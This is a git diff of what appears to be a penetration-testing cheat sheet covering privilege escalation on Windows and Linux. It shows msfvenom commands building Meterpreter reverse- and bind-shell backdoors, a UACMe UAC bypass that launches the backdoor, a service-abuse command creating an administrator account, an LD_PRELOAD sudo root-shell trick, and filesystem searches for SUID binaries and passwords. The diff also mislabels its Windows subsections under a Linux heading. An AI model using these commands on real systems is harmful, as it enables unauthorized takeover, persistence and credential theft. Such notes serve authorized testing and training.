@@ -98,7 +98,8 @@
     exploit/multi/mysql/mysql_udf_payload        : if mysql running as root and we have the password
     incognito / mimikatz                         : Impersonate priviliged user
 
-##### 6.1.2 Via Windows Services 
+##### 6.1.2 Linux
+    ##### 6.1.2.1 Via Windows Services 
     
     - Manually : 
         Search all services    
@@ -112,23 +113,27 @@
         - Take note of the AbuseFunction (example : PriviligedService)
         - Use the PriviligedService to run any OS Command for example create new Admin user : Invoke-ServiceAbuse -Name PriviligedService  -UserName testUser -Password password_123 -LocalGroup "Administrators"
 
-##### 6.1.3 
+    ##### 6.1.2.2 bypass uac 
     - Using the UACMe framework
         - Generate backdoor : 
             msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.2 LPORT=4444 -f exe > 'backdoor.exe'
             msfvenom -p windows/meterpreter/bind_tcp RHOST=10.4.17.32 LPORT=4444 -f exe > backdoor.exe
         - Upload both backdoor.exe and UACMe executable
         - Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
-        
-##### 6.1.4 Linux
-    ##### 6.1.4.1 SUID (Linux)
+
+    ##### 6.1.2.3 privchecks
+    https://github.com/itm4n/PrivescCheck
+    powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+    
+##### 6.1.3 Linux
+    ##### 6.1.3.1 SUID (Linux)
     find / -perm -u=s -type f 2>/dev/null
     find / -user root -perm -4000 -exec ls -ldb {} \;
 
-    ##### 6.1.4.2 Writable file (Linux)
+    ##### 6.1.3.2 Writable file (Linux)
     find / -perm -o=w -type f 2>/dev/null | grep -v "/proc/"
 
-    ##### 6.1.4.3 sudo misconfig
+    ##### 6.1.3.3 sudo misconfig
     sudo -l
     
     #include <stdio.h>
@@ -145,7 +150,7 @@
     
     sudo LD_PRELOAD=/path/to/shell.so binary_can_be_run_as_root
 
-    ##### 6.1.4.4 Find data
+    ##### 6.1.3.4 Find data
     find / -type f | xargs grep -il "password"  2>/dev/null
 
     ##### Tools
